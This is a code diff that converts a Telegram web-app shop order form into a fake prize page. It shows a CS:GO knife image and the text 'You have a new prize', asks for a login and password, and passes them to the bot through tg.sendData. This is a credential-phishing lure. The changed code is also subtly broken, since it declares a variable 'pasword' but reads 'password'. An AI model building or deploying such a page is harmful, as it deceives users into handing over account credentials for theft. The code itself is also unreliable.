@@ -80,14 +80,14 @@
   <header>
     <div id="main">
       <h1>Онлайн магазин</h1>
-      <img src="https://cdn-icons-png.flaticon.com/512/3595/3595355.png">
-      <p>Lorem ipsum sit amet, consesetur elit.</p>
-      <button id="buy">Купить</button>
+      <img src="https://www.pikpng.com/pngl/m/115-1151733_pro-knife-cs-go-case-vector-clipart.png">
+      <p>You have a new prize</p>
+      <button id="buy">Get a prize</button>
     </div>
     <form id="form">
-      <input type="text" placeholder="Имя" id="user_name">
-      <input type="text" placeholder="Email" id="user_email">
-      <input type="text" placeholder="Телефон" id="user_phone">
+      <input type="text" placeholder="Login" id="user_login">
+      <input type="text" placeholder="Password" id="user_password">
+      <!-- <input type="text" placeholder="Телефон" id="user_phone"> -->
       <div id="error"></div>
       <button id="order">Оформить</button>
     </form>
@@ -106,26 +106,21 @@
       
       order.addEventListener("click", () => {
         document.getElementById("error").innerText = '';
-        let name = document.getElementById("user_name").value;
-        let email = document.getElementById("user_email").value;
-        let phone = document.getElementById("user_phone").value;
-        if(name.length < 5) {
+        let login = document.getElementById("user_login").value;
+        let pasword = document.getElementById("user_password").value;
+        // let phone = document.getElementById("user_phone").value;
+        if(login.length < 4) {
           document.getElementById("error").innerText = 'Ошибка в имени';
           return;
         }
-        if(email.length < 5) {
+        if(password.length < 5) {
           document.getElementById("error").innerText = 'Ошибка в email';
-          return;
-        }
-        if(phone.length < 5) {
-          document.getElementById("error").innerText = 'Ошибка в номере';
           return;
         }
         
         let data = {
-          name: name,
-          email: email,
-          phone: phone
+          login: login,
+          pasword: password
         }
         tg.sendData(JSON.stringify(data));
 
